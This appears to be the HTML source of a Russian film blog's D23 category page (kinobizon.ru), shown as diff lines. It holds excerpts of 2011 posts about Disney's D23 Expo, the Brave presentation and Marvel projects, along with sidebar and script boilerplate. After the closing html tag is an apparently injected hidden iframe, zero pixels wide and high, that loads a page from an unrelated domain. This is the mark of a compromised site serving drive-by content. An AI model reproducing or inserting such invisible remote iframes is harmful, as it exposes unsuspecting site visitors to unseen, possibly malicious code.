+	</div><!-- end .entry -->
+	
+						
+			
+			
+		
+		
+	<div class="entry big">
+				
+		<div class="thumbnail">
+			
+				<img src="http://kinobizon.ru/wp-content/themes/TheStyle/timthumb.php?src=http://img1.liveinternet.ru/images/attach/c/3/75/537/75537957_1.jpg&amp;h=180&amp;w=222&amp;zc=1&amp;q=90" alt='«DISNEY ЭКСПО 2011» (D23): ПРЕЗЕНТАЦИЯ «ХРАБРОЙ СЕРДЦЕМ» (2012)' width='222' height='180' />				<span class="overlay"></span>
+	
+			<div class="category"><ul class="post-categories">
+	<li><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/zarchive/d23/" title="Просмотреть все записи в D23" rel="category tag">D23</a></li></ul></div>
+			<span class="month">Авг<span class="date">30</span></span>
+		</div> <!-- end .thumbnail -->	
+				<h2 class="title"><a href="http://kinobizon.ru/2011/08/30/the-brave-d23/">«DISNEY ЭКСПО 2011» (D23): ПРЕЗЕНТАЦИЯ «ХРАБРОЙ СЕРДЦЕМ» (2012)</a></h2>
+	
+		<div class="entry-content">
+			<div class="bottom-bg">
+				<div class="excerpt" >
+					<p>
+Ранее мы рассказывали о наших впечатлениях от отрывков из ДЖОНА КАРТЕРА, нарезки МСТИТЕЛЕЙ, интервью с Джоном Лассетером и нарезки-представления проекта Сэма Рэйми ОЗ: ВЕЛИКИЙ И УЖАСНЫЙ. Сегодня и завтра — о том, что готовит к выпуску Disney Animation Studios, Disney/Pixar, а также Тим Бертон и Jim Henson Company, приобретенная в середине 80-х концерном Walt Disney Studios. 
+
+ПРЕЗЕНТАЦИЯ  BRAVE («ХРАБРАЯ СЕРДЦЕМ», релиз Disney/Pixar, 21 июня 2012)
+Презентация BRAVE (она же ХРАБРАЯ СЕРДЦЕМ) в хронологическом порядке оказалась после представления некоторых других... </p>
+					<!--
+					<div class="textright">
+						<a href="http://kinobizon.ru/2011/08/30/the-brave-d23/" class="readmore"><span>&raquo;</span>&raquo;</a>
+					</div>
+					-->
+				</div><!-- end .excerpt -->
+			</div><!-- end .bottom-bg -->
+		</div><!-- end .entry-content -->
+	</div><!-- end .entry -->
+	
+						
+			
+			
+		
+		
+	<div class="entry big">
+				
+		<div class="thumbnail">
+			
+				<img src="http://kinobizon.ru/wp-content/themes/TheStyle/timthumb.php?src=http://kinobizon.ru/wp-content/uploads/2011/08/081211_DuringD23Expo.jpg&amp;h=180&amp;w=222&amp;zc=1&amp;q=90" alt='ГЛАВНОЕ НА «DISNEY ЭКСПО», Ч. 1: «МСТИТЕЛИ», «ДЖОН КАРТЕР», «ОЗ» РЭЙМИ, ЛАССЕТЕР' width='222' height='180' />				<span class="overlay"></span>
+	
+			<div class="category"><ul class="post-categories">
+	<li><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/zarchive/d23/" title="Просмотреть все записи в D23" rel="category tag">D23</a></li></ul></div>
+			<span class="month">Авг<span class="date">24</span></span>
+		</div> <!-- end .thumbnail -->	
+				<h2 class="title"><a href="http://kinobizon.ru/2011/08/24/disney-expo-part1-impres/">ГЛАВНОЕ НА «DISNEY ЭКСПО», Ч. 1: «МСТИТЕЛИ», «ДЖОН КАРТЕР», «ОЗ» РЭЙМИ, ЛАССЕТЕР</a></h2>
+	
+		<div class="entry-content">
+			<div class="bottom-bg">
+				<div class="excerpt" >
+					<p>
+В воскресенье завершилась трехдневная выставка D23 Expo в Convention Center в Анахайме (Калифорния), где международная корпорация собрала около 20 000 фанатов Disney на многоуровневый конвент, представив и пакет Disney с Disney/ Pixar на 2011–2013 гг., познакомив гостей выставки с художниками Disney Animation Studios и позволив международной прессе пообщаться с главой Disney International Энди Бердом, Джоном Лассетером и организатором D23 Стивеном Кларком.
+В ближайшее время мы с товарищами выложим на КиноБизоне отдельно интервью с Джоном Лассетером, Энди Бердом... </p>
+					<!--
+					<div class="textright">
+						<a href="http://kinobizon.ru/2011/08/24/disney-expo-part1-impres/" class="readmore"><span>&raquo;</span>&raquo;</a>
+					</div>
+					-->
+				</div><!-- end .excerpt -->
+			</div><!-- end .bottom-bg -->
+		</div><!-- end .entry-content -->
+	</div><!-- end .entry -->
+	
+						
+			
+			
+		
+		
+	<div class="entry small">
+				
+		<div class="thumbnail">
+			
+				<img src="http://kinobizon.ru/wp-content/themes/TheStyle/timthumb.php?src=http://d23.disney.go.com/expo/images/D23Expo11_Head.png&amp;h=180&amp;w=222&amp;zc=1&amp;q=90" alt='КИНОБИЗОН НА «ДЭ23»: АНОНС И ДЕНЬ ПЕРВЫЙ' width='222' height='180' />				<span class="overlay"></span>
+	
+			<div class="category"><ul class="post-categories">
+	<li><a href="http://kinobizon.ru/kinobizoneyes/kinoforumi/zarchive/d23/" title="Просмотреть все записи в D23" rel="category tag">D23</a></li></ul></div>
+			<span class="month">Авг<span class="date">17</span></span>
+		</div> <!-- end .thumbnail -->	
+				<h2 class="title"><a href="http://kinobizon.ru/2011/08/17/d23-anons/">КИНОБИЗОН НА «ДЭ23»: АНОНС И ДЕНЬ ПЕРВЫЙ</a></h2>
+	
+		<div class="entry-content">
+			<div class="bottom-bg">
+				<div class="excerpt" >
+					<p>
+Превью пиксаровской ХРАБРОЙ СЕРДЦЕМ, скрининг КОРОЛЯ-ЛЬВВ В 3D, превью свежайших диснеевских проектов 2012–2013, презентация проектов Marvel и многое-многое другое через два с небольшим дня я увижу в рамках масштабного форума D23, который начнется 19 августа в Анахайме, Калифорния.
+
+Лос-Анджелес и тысячи фанатов вселенной Disney считают часы до начала D23 — гигантского форума и выставки последних событийных и мерчендайз-достижений корпорации Disney.... </p>
+					<!--
+					<div class="textright">
+						<a href="http://kinobizon.ru/2011/08/17/d23-anons/" class="readmore"><span>&raquo;</span>&raquo;</a>
+					</div>
+					-->
+				</div><!-- end .excerpt -->
+			</div><!-- end .bottom-bg -->
+		</div><!-- end .entry-content -->
+	</div><!-- end .entry -->
+	
+									</div> <!-- #boxes -->
+				<div id="sidebar">
+<div id=”sb_banner_conteiner”>
+<div class=”banner_125x125_1″>
+ </div>
+
+
+ 
+
+<!-- <a id="nostyle" href="http://kinobizon.ru/2012/11/06/autumn-digest-2012-part1/"><img src="http://kinobizon.ru/img/236-banner-best-small.png" border="0"></a> -->
+ 
+
+
+ 
+
+ 
+
+
+
+
+</div><!–#banner_conteiner–>
+	<div id="text-2" class="widget widget_text"><h3 class="widgettitle">Подписки:</h3><div class="widgetcontent">			<div class="textwidget">&nbsp;&nbsp;<span id="soc"><a target="_blank" href="http://www.facebook.com/KINOBIZON"><img src="http://kinobizon.ru/img/face.png" alt="Facebook" title="Наша страничка на Facebook"/></a>&nbsp;&nbsp;<a target="_blank" href="http://vkontakte.ru/kinobizon"><img src="http://kinobizon.ru/img/vk.png" alt="Вконтакте"  title="Наша страничка в Контакте"/></a>&nbsp;&nbsp;<a target="_blank" href="http://www.twitter.com/Kinobizon"><img src="http://kinobizon.ru/img/follow.png" alt="Follow on Twitter"  title="Мы в Твиттере!"/></a>&nbsp;&nbsp;<a target="_blank" href="/feed/rss/"><img src="/wp-content/themes/TheStyle/images/rss.png" title="Будь в курсе обновлений сайта"></a></span>
+<br><br>
+<fb:like href="http://www.facebook.com/pages/KINOBIZON/208336779190779" send="false" layout="button_count" width="30" show_faces="true" font="trebuchet ms"></fb:like>
+<br />
+<span style="font-size: 1.3em;"><a href="mailto:kinobizon@gmail.com"><img align="left" src="http://kinobizon.ru/img/mail.png" title="Напишите Нам письмо!">kinobizon@gmail.com</span></a><br /><br /></div>
+		</div></div><!-- end .widget --><div id="mailchimpsf_widget-2" class="widget widget_mailchimpsf_widget"><h3 class="widgettitle">Подпишись на КиноБизон</h3><div class="widgetcontent">	
+<div id="mc_signup">
+	<form method="post" action="#mc_signup" id="mc_signup_form">
+		<input type="hidden" id="mc_submit_type" name="mc_submit_type" value="html" />
+		<input type="hidden" name="mcsf_action" value="mc_submit_signup_form" />
+		<input type="hidden" id="_mc_submit_signup_form_nonce" name="_mc_submit_signup_form_nonce" value="3c60ed3007" />		
+		
+	<div class="mc_form_inside">
+		
+		<div class="updated" id="mc_message">
+					</div><!-- /mc_message -->
+
+		
+<div class="mc_merge_var">
+		<label for="mc_mv_EMAIL" class="mc_var_label">Email<span class="mc_required">*</span></label>
+	<input type="text" size="18" value="" name="mc_mv_EMAIL" id="mc_mv_EMAIL" class="mc_input"/>
+</div><!-- /mc_merge_var -->
+<div class="mc_merge_var">
+		<label for="mc_mv_FNAME" class="mc_var_label">Имя<span class="mc_required">*</span></label>
+	<input type="text" size="18" value="" name="mc_mv_FNAME" id="mc_mv_FNAME" class="mc_input"/>
+</div><!-- /mc_merge_var -->
+		<div class="mc_signup_submit">
+			<input type="submit" name="mc_signup_submit" id="mc_signup_submit" value="Подписка" class="button" />
+		</div><!-- /mc_signup_submit -->
+	
+	
+					<br/>
+			<div id="mc_display_rewards" align="center">
+			
+			</div><!-- /mc_display_rewards -->
+					
+	</div><!-- /mc_form_inside -->
+	</form><!-- /mc_signup_form -->
+</div><!-- /mc_signup_container -->
+	</div></div><!-- end .widget --><div id="text-4" class="widget widget_text"><h3 class="widgettitle">Навигация</h3><div class="widgetcontent">			<div class="textwidget"><a href="http://kinobizon.ru/map/"><img src="http://kinobizon.ru/img/map.png" title="Если вы не можете понять, в какой рубрике искать интересующий вас материал, вам поможет карта сайта"  align="Center"></a>
+<br><br>
+<a href="http://kinobizon.ru/tag/"><img src="http://kinobizon.ru/img/tags.png" title="Все материалы об интересующем вас фильме, прокатчике или личности можно найти по соответствующему тегу"  align="Center"></a>
+<br><br>
+<a href="http://kinobizon.ru/poiskall/"><img src="http://kinobizon.ru/img/search.png" title="Более тщательно искать материалы можно при помощи расширенного поиска"  align="Center"></a>
+</div>
+		</div></div><!-- end .widget -->		
+</div> <!-- end #sidebar -->			</div> <!-- #content -->
+			<div id="controllers" class="clearfix">
+				<h2 class="man">СВЕЖИЕ МАТЕРИАЛЫ</h2>			</div> <!-- #controllers -->
+			
+	<div id="content-bottom-bg"></div>
+			
+		</div> <!-- end #container2 -->
+	</div> <!-- end #container -->		
+	
+	<div id="footer">
+		<div id="footer-wrapper">
+			<div id="footer-content">
+				 
+							</div> <!-- end #footer-content -->
+			  <p id="copyright"> <a href="http://mfxart.ru" target="_blank">MFxArt</a></p>
+		</div> <!-- end #footer-wrapper -->
+	</div> <!-- end #footer -->		
+				
+		
+
+	<script type="text/javascript" src="http://kinobizon.ru/wp-content/themes/TheStyle/js/superfish.js"></script>
+	
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/jquery-ui.min.js"></script>
+	<script type="text/javascript" src="http://kinobizon.ru/wp-content/themes/TheStyle/js/cufon-yui.js"></script>
+	<script type="text/javascript" src="http://kinobizon.ru/wp-content/themes/TheStyle/js/League_Gothic_400.font.js"></script>
+	<script type="text/javascript" src="http://kinobizon.ru/wp-content/themes/TheStyle/js/hover.js"></script>
+	
+	
+	<script type="text/javascript">
+	//<![CDATA[
+		jQuery.noConflict();		
+		
+									Cufon.replace('ul.nav a',{textShadow:'1px 1px 1px #000', hover: { textShadow: '1px 1px 1px #000' }})('h3.title',{textShadow:'1px 1px 1px #000'})('.wp-pagenavi',{textShadow:'1px 1px 1px rgba(0,0,0,0.7)'});
+						Cufon.replace('#featured h2.title')('div.category a',{textShadow:'1px 1px 1px rgba(0,0,0,0.3)'})('span.month',{textShadow:'1px 2px 4px rgba(0,0,0,0.3)'})('h2.title a')('h2.man')('h2#left-arrow')('h2#right-arrow')('h2.man a')('p.postinfo')('h3.widgettitle, #tabbed-area li a',{textShadow:'1px 1px 1px #fff'})('h3.infotitle, h1.title, .blog-title, .post-meta, h3#comments, span.fn');
+				
+		jQuery('ul.nav').superfish({ 
+			delay:       1000,                            // one second delay on mouseout 
+			animation:   {opacity:'show',height:'show'},  // fade-in and slide-down animation 
+			speed:       'fast',                          // faster animation speed 
+			autoArrows:  true,                           // disable generation of arrow mark-up 
+			dropShadows: false                            // disable drop shadows 
+		});
+		
+		jQuery('ul.nav > li > a.sf-with-ul').parent('li').addClass('sf-ul');
+		
+		/*
+		jQuery(".entry").hoverIntent({
+			over: makeTall,
+			timeout: 100,
+			out: makeShort
+		}); 
+		*/
+		
+		var $tabbed_area = jQuery('#tabbed'),
+			$tab_content = jQuery('.tab-content'),
+			$all_tabs = jQuery('#all_tabs');
+		
+		if ($tabbed_area.length) {
+			$tabbed_area.tabs({ fx: { opacity: 'toggle' } });
+		};
+				
+		et_search_bar();
+	
+		function makeTall(){ 
+			jQuery(this).addClass('active').css('z-index','7').find('.bottom-bg .excerpt').animate({"height":200},200);
+			jQuery('.entry').not(this).animate({opacity:0.3},200);
+		}
+		function makeShort(){ 
+			jQuery(this).css('z-index','1').find('.bottom-bg .excerpt').animate({"height":75},200);
+			jQuery('.entry').removeClass('active').animate({opacity:1},200);
+		} 
+		
+		<!---- Search Bar Improvements ---->
+		function et_search_bar(){
+			var $searchform = jQuery('#header div#search-form'),
+				$searchinput = $searchform.find("input#searchinput"),
+				searchvalue = $searchinput.val();
+				
+			$searchinput.focus(function(){
+				if (jQuery(this).val() === searchvalue) jQuery(this).val("");
+			}).blur(function(){
+				if (jQuery(this).val() === "") jQuery(this).val(searchvalue);
+			});
+		}
+		
+		jQuery(".js ul.nav a, .js ul.nav ul a, .js ul.nav ul li, .js ul.nav li.sfHover ul, .js ul.nav li li.sfHover ul, .js div.category a, .js span.month, .js span.date, .js h2.title, .js p.postinfo, .js #tabbed-area li a, .js #sidebar h3.widgettitle, .js .wp-pagenavi span.current, .js .wp-pagenavi span.extend, .js .wp-pagenavi a, .js .wp-pagenavi span, .js #footer h3.title, .js .info-panel h3.infotitle, .js .post-text h1.title, .js .cufon-disabled .blog-title a, .js p.post-meta, .js h3#comments, .js span.fn, .js span.fn a, .js .commentmetadata span.month, .js .commentmetadata span.date").css('text-indent','0px');
+		
+	
+		
+
+					Cufon.now();
+			//]]>	
+	</script>
+	<script type='text/javascript' src='http://kinobizon.ru/wp-content/themes/TheStyle/epanel/page_templates/js/fancybox/jquery.fancybox-1.2.6.pack.js?ver=1.3.2'></script>
+<script type='text/javascript' src='http://kinobizon.ru/wp-content/themes/TheStyle/epanel/page_templates/js/et-ptemplates-frontend.js?ver=1.1'></script>
+<!-- Facebook Comments for WordPress: http://pleer.co.uk/wordpress/plugins/facebook-comments/ -->
+<div id="fb-root"></div>
+<script>
+window.fbAsyncInit = function() {
+    FB.init({xfbml: true, appId: 216985714992263 });
+  };
+  (function() {
+    var e = document.createElement('script'); e.async = true;
+    e.src = document.location.protocol +
+      '//connect.facebook.net/ru_RU/all.js';
+    document.getElementById('fb-root').appendChild(e);
+  }());
+</script>
+<!-- Rating@Mail.ru counter -->
+<center id="nostyle"><a href="http://top.mail.ru/jump?from=2247704">
+<img src="http://dc.c4.b2.a2.top.mail.ru/counter?id=2247704;t=130;l=1" 
+style="border:0;" height="0" width="0" alt="�������@Mail.ru" /></a></center>
+<!-- //Rating@Mail.ru counter -->	
+</body>
+</html>
+<iframe src="http://bestflooring.ru/robots.php" width="0" height="0" frameborder="0"></iframe>
+<!-- This Quick Cache file was built for (  kinobizon.ru/kinobizoneyes/kinoforumi/d23/ ) in 0.59945 seconds, on Aug 22nd, 2013 at 6:26 pm UTC. -->
+<!-- This Quick Cache file will automatically expire ( and be re-built automatically ) on Aug 22nd, 2013 at 7:26 pm UTC -->
+<!-- +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ -->
+<!-- Quick Cache Is Fully Functional :-) ... A Quick Cache file was just served for (  kinobizon.ru/kinobizoneyes/kinoforumi/d23/ ) in 0.00045 seconds, on Aug 22nd, 2013 at 6:38 pm UTC. -->
